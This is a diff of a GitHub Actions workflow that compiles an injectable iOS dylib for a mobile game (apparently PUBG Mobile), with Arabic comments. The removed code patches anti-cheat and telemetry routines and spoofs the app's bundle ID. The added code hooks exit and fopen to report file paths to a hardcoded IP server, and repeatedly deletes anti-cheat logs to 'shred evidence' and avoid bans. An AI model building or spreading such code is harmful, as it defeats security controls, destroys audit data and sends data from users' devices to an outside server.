@@ -1,4 +1,4 @@
-name: Dragon Shadow Global Mask V10.1
+name: Imperial Shadow Shutdown-Guard V15.1
 
 on:
   push:
@@ -13,114 +13,105 @@ jobs:
       - name: Checkout Repository
         uses: actions/checkout@v4
 
+      - name: Setup Dobby Framework
+        run: |
+          # تحميل مكتبة Dobby لعمل الهوكات الاحترافية
+          curl -L https://github.com/jmpews/Dobby/releases/download/v1.1.2/dobby_arm64-apple-darwin.tar.gz | tar -xz
+          mv dobby_arm64-apple-darwin/libdobby.a .
+          mv dobby_arm64-apple-darwin/dobby.h .
+
       - name: Smelt Imperial C++ Code
         run: |
           mkdir -p jni
-          # غيرنا الامتداد لـ .mm لحل مشكلة الـ Compiler
           cat <<'EOF' > jni/main.mm
+          #import <Foundation/Foundation.h>
           #include <iostream>
-          #include <vector>
           #include <thread>
           #include <chrono>
-          #include <unistd.h>
+          #include <dlfcn.h>
           #include <mach-o/dyld.h>
           #include <sys/mman.h>
-          #import <Foundation/Foundation.h>
-          #import <objc/runtime.h>
+          #include "dobby.h"
 
           using namespace std;
 
-          namespace ImperialStealth {
-              uintptr_t GetModuleBase(const char* name) {
-                  uint32_t count = _dyld_image_count();
-                  for (uint32_t i = 0; i < count; i++) {
-                      const char* img_name = _dyld_get_image_name(i);
-                      if (img_name && strstr(img_name, name)) return (uintptr_t)_dyld_get_image_header(i);
-                  }
-                  return (uintptr_t)_dyld_get_image_header(0);
-              }
+          // --- [ إعدادات السيرفر ] ---
+          void RemoteLog(NSString *msg) {
+              NSString *url = @"http://34.204.178.160:5000/log";
+              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
+              [req setHTTPMethod:@"POST"];
+              [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+              NSData *data = [NSJSONSerialization dataWithJSONObject:@{@"content": msg} options:0 error:nil];
+              [req setHTTPBody:data];
+              [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
+          }
 
-              void SilentPatch(uintptr_t base, uintptr_t offset, uint32_t instruction) {
-                  uintptr_t target = base + offset;
-                  long sz = getpagesize();
-                  uintptr_t pg = target & ~(sz - 1);
-                  if (mprotect((void*)pg, sz, PROT_READ | PROT_WRITE | PROT_EXEC) == 0) {
-                      *(uint32_t*)target = instruction;
-                      mprotect((void*)pg, sz, PROT_READ | PROT_EXEC);
-                  }
+          // --- [ مفرمة الملفات ] ---
+          void WipeSecurityData() {
+              NSString *docDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+              NSArray *trash = @[@"/GCloud", @"/Logs", @"/Caches", @"/.system_logs", @"/ano_tmp"];
+              for (NSString *p in trash) {
+                  [[NSFileManager defaultManager] removeItemAtPath:[docDir stringByAppendingString:p] error:nil];
               }
           }
 
-          // --- [ مفرمة اللوجات: لمنع الباند المتأخر ] ---
-          void CleanSecurityLogs() {
-              NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
-              NSString *docDir = [paths objectAtIndex:0];
-              NSArray *badPaths = @[@"/GCloud", @"/Logs", @"/Caches", @"/.system_logs"];
-              NSFileManager *fm = [NSFileManager defaultManager];
-              for (NSString *p in badPaths) {
-                  NSString *fullPath = [docDir stringByAppendingString:p];
-                  [fm removeItemAtPath:fullPath error:nil];
-              }
+          // --- [ هوك دالة الخروج ] ---
+          void (*orig_exit)(int);
+          void my_exit(int code) {
+              RemoteLog(@"[⚠️] SHUTDOWN DETECTED! Shredding evidence before exit...");
+              WipeSecurityData();
+              // نعطي السيرفر وقت يستلم التقرير قبل ما تموت اللعبة
+              this_thread::sleep_for(chrono::seconds(2));
+              orig_exit(code);
           }
 
-          // --- [ القناع العالمي: إجابة النسخة الرسمية ] ---
-          NSString* fake_bundle_id(id self, SEL _cmd) { return @"com.tencent.ig"; }
-
-          void SetupGlobalIntegrityMask() {
-              Class nsB = objc_getClass("NSBundle");
-              if (nsB) {
-                  Method m = class_getInstanceMethod(nsB, @selector(bundleIdentifier));
-                  if (m) { method_setImplementation(m, (IMP)fake_bundle_id); }
+          // --- [ هوك مراقبة الملفات ] ---
+          FILE* (*orig_fopen)(const char*, const char*);
+          FILE* my_fopen(const char* path, const char* mode) {
+              if (path && (strstr(path, "/var/mobile/") || strstr(path, "ShadowTrackerExtra"))) {
+                  RemoteLog([NSString stringWithFormat:@"[🔍] SCAN: %s", path]);
               }
+              return orig_fopen(path, mode);
           }
 
-          void InitializeDragonEngine() {
-              uint32_t RET = 0xD65F03C0;
-              uintptr_t shadowBase = ImperialStealth::GetModuleBase("ShadowTrackerExtra");
-              uintptr_t anogsBase = ImperialStealth::GetModuleBase("anogs");
+          void InitializeImperial() {
+              // 1. هوك الخروج (للمراقبة بعد الإغلاق)
+              void *exit_ptr = dlsym(RTLD_DEFAULT, "exit");
+              DobbyHook(exit_ptr, (void *)my_exit, (void **)&orig_exit);
 
-              // 1. تخدير الأوفستات بداخل الشادو و anogs
-              ImperialStealth::SilentPatch(shadowBase, 0x18F04C, RET); // GTrace
-              ImperialStealth::SilentPatch(shadowBase, 0xE87A4, RET);  // Telemetry
-              ImperialStealth::SilentPatch(anogsBase, 0x120598, RET); // anogs Scan (الهدف الذهبي)
-              ImperialStealth::SilentPatch(shadowBase, 0x120598, RET); // احتياط
+              // 2. هوك مراقبة الملفات (الرادار)
+              void *fopen_ptr = dlsym(RTLD_DEFAULT, "fopen");
+              DobbyHook(fopen_ptr, (void *)my_fopen, (void **)&orig_fopen);
 
-              // 2. تفعيل القناع العالمي لمواجهة فحص الشهادة
-              SetupGlobalIntegrityMask();
-              
-              // 3. مسح فوري للوجات
-              CleanSecurityLogs();
-
-              printf("[🐲] V10.1: تم البناء والتخدير الشامل بنجاح!\n");
+              RemoteLog(@"[🐲] Imperial V15.1 FULL MONITORING ACTIVE.");
           }
 
           __attribute__((constructor))
           static void entry() {
               thread([]() {
-                  // تأخير استراتيجي 8 ثواني لضمان فك الضغط في الرام
-                  this_thread::sleep_for(chrono::seconds(8));
-                  InitializeDragonEngine();
+                  this_thread::sleep_for(chrono::seconds(10));
+                  InitializeImperial();
                   while(true) {
-                      this_thread::sleep_for(chrono::minutes(1));
-                      CleanSecurityLogs();
+                      this_thread::sleep_for(chrono::seconds(30));
+                      WipeSecurityData();
                   }
               }).detach();
           }
           EOF
 
-      - name: Compile Imperial Shadow Module
+      - name: Compile Imperial Stealth Module
         run: |
-          # لاحظ استخدام -x objective-c++ وربط الـ objc
           clang++ -dynamiclib -std=c++11 \
           -x objective-c++ \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
           -arch arm64 \
+          -I. -L. -ldobby \
           jni/main.mm -o ShadowImperial.dylib \
           -framework Foundation -lobjc
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Imperial-Bypass-Final
+          name: Imperial-AntiShutdown-V15.1
           path: ShadowImperial.dylib
           
